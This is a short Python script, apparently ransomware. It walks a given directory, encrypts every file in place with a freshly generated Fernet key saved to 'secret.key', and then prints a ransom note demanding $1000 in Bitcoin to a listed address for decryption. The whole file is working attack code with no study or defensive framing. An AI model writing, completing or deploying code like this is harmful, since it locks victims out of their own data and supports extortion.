#!/usr/bin/env python3
import os
import sys
from cryptography.fernet import Fernet

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 encrypt.py <directory>")
        sys.exit(1)

    directory = sys.argv[1]
    if not os.path.isdir(directory):
        print(f"Error: {directory} is not a valid directory.")
        sys.exit(1)

    key = generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

    print(f"Encrypting files in {directory}...")
    encrypt_directory(directory, key)
    print("All files have been encrypted.")

    print("\n=== IMPORTANT ===")
    print("Your files have been encrypted. To decrypt them, you need the decryption key.")
    print("Send $1000 in Bitcoin to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    print("Once payment is received, you will receive the decryption key.")
    print("=== IMPORTANT ===")

if __name__ == "__main__":
    main()

